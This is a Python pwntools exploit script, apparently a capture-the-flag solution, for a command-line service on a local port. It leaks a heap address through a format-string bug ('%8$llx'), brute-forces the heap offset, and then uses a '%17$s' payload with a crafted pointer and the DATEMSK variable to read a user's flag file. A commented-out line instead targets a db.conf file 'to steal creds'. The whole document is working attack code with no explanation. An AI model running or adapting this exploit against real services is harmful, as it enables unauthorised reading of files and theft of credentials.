#!/usr/bin/env python3
import pwn
pwn.context.terminal = ['tmux', 'splitw', '-h']

def set_env(io: pwn.tube, name: bytes, value: bytes) -> None:
    io.sendlineafter(b"# ", b"env")
    io.sendlineafter(b": ", b"set")
    io.sendlineafter(b": ", name)
    io.sendlineafter(b": ", value)

def view_logs(io: pwn.tube, bebra: bytes = b'') -> None:
    io.sendlineafter(b"# ", b"logs")
    io.sendlineafter(b": ", b"view\x00\x00\x00\x00" + bebra)

def solve(io: pwn.tube, off: int) -> None:
    gdbscript = '''
vmmap
'''
    # pwn.gdb.attach(io, gdbscript = gdbscript)

    # get xetrov home listing and view db.conf file
    # io.sendlineafter(b"# ", b"env")
    # io.sendlineafter(b": ", b"set")
    # io.sendlineafter(b": ", b"PWD")
    # io.sendlineafter(b": ", b"/home/xetrov")
    # io.sendlineafter(b"# ", b"ls")

    set_env(io, b'leak', b'%8$llx')
    view_logs(io)

    while True:
        line = io.recvline()

        if b'leak=' not in line:
            continue

        leak = line.strip().split(b'leak=')[1]
        heap_base = int(leak, 16) - off
        print(f'heap_base @ 0x{heap_base:x}')
        break

    target = heap_base + 0x2a20

    set_env(io, b'content', b'%17$s')

    # to steal creds
    #set_env(io, b'DATEMSK', b'/home/xetrov/db.conf')
    # to steal flag
    set_env(io, b'DATEMSK', b'/home/xetrov/user.txt')
    view_logs(io, pwn.p64(target))
    io.recvuntil(b"new env content=")
    print(io.recvuntil(b"#").decode())

def main() -> None:
    #io = pwn.process('./cli')
    for i in range(0, 0x100000, 0x10):
        io = pwn.remote('0.0.0.0', 19191)

        try:
            solve(io, i)
        finally:
            io.close()

if __name__ == '__main__':
    main()

